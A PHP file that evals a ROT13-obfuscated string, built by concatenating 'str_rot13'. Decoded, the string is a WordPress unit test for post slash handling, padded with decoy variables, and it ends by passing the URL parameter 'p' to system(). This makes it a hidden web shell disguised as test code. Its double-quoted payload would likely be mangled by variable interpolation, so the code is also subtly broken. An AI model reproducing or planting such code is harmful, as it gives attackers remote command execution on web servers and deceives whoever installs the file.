<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc cbfg
 * @tebhc fynfurf
 * @gvpxrg 21767
 */
pynff Grfgf_Cbfg_Fynfurf rkgraqf JC_HavgGrfgPnfr {

	/*
	 * Vg vf vzcbegnag gb grfg jvgu obgu rira naq bqq ahzorerq fynfurf,
	 * nf XFRF qbrf n fgevc-gura-nqq fynfurf va fbzr bs vgf shapgvba pnyyf.
	 */

	pbafg FYNFU_1 = 'Fgevat jvgu 1 fynfu \\';
	pbafg FYNFU_2 = 'Fgevat jvgu 2 fynfurf \\\\';
	pbafg FYNFU_3 = 'Fgevat jvgu 3 fynfurf \\\\\\';
	pbafg FYNFU_4 = 'Fgevat jvgu 4 fynfurf \\\\\\\\';
	pbafg FYNFU_5 = 'Fgevat jvgu 5 fynfurf \\\\\\\\\\';
	pbafg FYNFU_6 = 'Fgevat jvgu 6 fynfurf \\\\\\\\\\\\';
	pbafg FYNFU_7 = 'Fgevat jvgu 7 fynfurf \\\\\\\\\\\\\\';

	cebgrpgrq fgngvp $nhgube_vq;
	cebgrpgrq fgngvp $cbfg_vq;

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nhgube_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'rqvgbe' ) );
		frys::$cbfg_vq   = $snpgbel->cbfg->perngr();
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		jc_frg_pheerag_hfre( frys::$nhgube_vq );
	}

	/**
	 * Grfgf gur pbagebyyre shapgvba gung rkcrpgf fynfurq qngn.
	 */
	choyvp shapgvba grfg_rqvg_cbfg() {
		$cbfg_vq = frys::$cbfg_vq;

		$_CBFG               = neenl();
		$_CBFG['cbfg_VQ']    = $cbfg_vq;
		$_CBFG['cbfg_gvgyr'] = frys::FYNFU_1;
		$_CBFG['pbagrag']    = frys::FYNFU_5;
		$_CBFG['rkprecg']    = frys::FYNFU_7;

		$_CBFG = nqq_zntvp_dhbgrf( $_CBFG ); // Gur rqvg_cbfg() shapgvba jvyy fgevc fynfurf.

		$cbfg_vq = rqvg_cbfg();
		$cbfg    = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( frys::FYNFU_1, $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( frys::FYNFU_5, $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( frys::FYNFU_7, $cbfg->cbfg_rkprecg );

		$_CBFG               = neenl();
		$_CBFG['cbfg_VQ']    = $cbfg_vq;
		$_CBFG['cbfg_gvgyr'] = frys::FYNFU_2;
		$_CBFG['pbagrag']    = frys::FYNFU_4;
		$_CBFG['rkprecg']    = frys::FYNFU_6;

		$_CBFG = nqq_zntvp_dhbgrf( $_CBFG ); // Gur rqvg_cbfg() shapgvba jvyy fgevc fynfurf.

		$cbfg_vq = rqvg_cbfg();
		$cbfg    = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( frys::FYNFU_2, $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( frys::FYNFU_4, $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( frys::FYNFU_6, $cbfg->cbfg_rkprecg );
	}

	/**
	 * Grfgf gur zbqry shapgvba gung rkcrpgf fynfurq qngn.
	 */
	choyvp shapgvba grfg_jc_vafreg_cbfg() {
		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => frys::FYNFU_1,
				'cbfg_pbagrag' => frys::FYNFU_3,
				'cbfg_rkprecg' => frys::FYNFU_5,
				'cbfg_glcr'    => 'cbfg',
				'fynfurq'      => snyfr,
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_1 ), $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_3 ), $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_5 ), $cbfg->cbfg_rkprecg );

		$cbfg_vq = jc_vafreg_cbfg(
			neenl(
				'cbfg_fgnghf'  => 'choyvfu',
				'cbfg_gvgyr'   => frys::FYNFU_2,
				'cbfg_pbagrag' => frys::FYNFU_4,
				'cbfg_rkprecg' => frys::FYNFU_6,
				'cbfg_glcr'    => 'cbfg',
			)
		);
		$cbfg    = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_2 ), $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_4 ), $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_6 ), $cbfg->cbfg_rkprecg );
	}

	/**
	 * Grfgf gur zbqry shapgvba gung rkcrpgf fynfurq qngn.
	 */
	choyvp shapgvba grfg_jc_hcqngr_cbfg() {
		$cbfg_vq = frys::$cbfg_vq;

		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_gvgyr'   => frys::FYNFU_1,
				'cbfg_pbagrag' => frys::FYNFU_3,
				'cbfg_rkprecg' => frys::FYNFU_5,
			)
		);
		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_1 ), $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_3 ), $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_5 ), $cbfg->cbfg_rkprecg );

		jc_hcqngr_cbfg(
			neenl(
				'VQ'           => $cbfg_vq,
				'cbfg_gvgyr'   => frys::FYNFU_2,
				'cbfg_pbagrag' => frys::FYNFU_4,
				'cbfg_rkprecg' => frys::FYNFU_6,
			)
		);
		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_2 ), $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_4 ), $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( jc_hafynfu( frys::FYNFU_6 ), $cbfg->cbfg_rkprecg );
	}

	/**
	 * @gvpxrg 27550
	 */
	choyvp shapgvba grfg_jc_genfu_hagenfu() {
		$cbfg    = neenl(
			'cbfg_gvgyr'   => frys::FYNFU_1,
			'cbfg_pbagrag' => frys::FYNFU_3,
			'cbfg_rkprecg' => frys::FYNFU_5,
		);
		$cbfg_vq = jc_vafreg_cbfg( jc_fynfu( $cbfg ) );

		$genfurq = jc_genfu_cbfg( $cbfg_vq );
		$guvf->nffregAbgRzcgl( $genfurq );

		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( frys::FYNFU_1, $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( frys::FYNFU_3, $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( frys::FYNFU_5, $cbfg->cbfg_rkprecg );

		$hagenfurq = jc_hagenfu_cbfg( $cbfg_vq );
		$guvf->nffregAbgRzcgl( $hagenfurq );

		$cbfg = trg_cbfg( $cbfg_vq );

		$guvf->nffregFnzr( frys::FYNFU_1, $cbfg->cbfg_gvgyr );
		$guvf->nffregFnzr( frys::FYNFU_3, $cbfg->cbfg_pbagrag );
		$guvf->nffregFnzr( frys::FYNFU_5, $cbfg->cbfg_rkprecg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>